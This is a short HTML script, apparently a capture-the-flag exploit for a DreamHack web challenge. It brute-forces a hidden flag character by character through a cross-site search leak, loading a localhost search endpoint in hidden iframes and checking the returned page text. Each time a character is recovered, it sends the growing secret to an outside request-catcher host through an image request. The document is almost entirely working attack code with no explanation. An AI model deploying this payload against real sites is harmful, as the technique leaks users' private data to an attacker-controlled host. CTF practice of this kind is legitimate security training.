<script>
async function req(url) {
    return new Promise((resolve, reject) => {
        const iframe = document.createElement("iframe");
        iframe.style.display = "none";
        iframe.src = url;
        iframe.onload = () => {
            try {
                // 예: iframe 내 body 텍스트 검사로 결과 유무 판단
                const bodyText = iframe.contentDocument.body.innerText || "";
                if (bodyText.includes("Hello World") || bodyText.includes("DreamHack") || bodyText.includes("DH{")) {
                    resolve();
                } else {
                    reject();
                }
            } catch(e) {
                reject();
            }
            iframe.remove();
        };
        document.body.appendChild(iframe);
    });
}

async function search(query) {
    try {
        await req(`http://localhost:8000/search?query=${encodeURIComponent(query)}`);
        return true;
    } catch {
        return false;
    }
}

async function exploit() {
    let chars = "0123456789abcdef}";
    let secret = "DH{";

    while (!secret.includes("}")) {
        for (let c of chars) {
            if (await search(secret + c)) {
                secret += c;
                new Image().src = `https://vaibykb.request.dreamhack.games/leak_${secret}`;
                await new Promise(r => setTimeout(r, 200));  // 0.2초 대기
                break;
            }
        }
    }
    console.log("Flag found:", secret);
}

exploit();
</script>
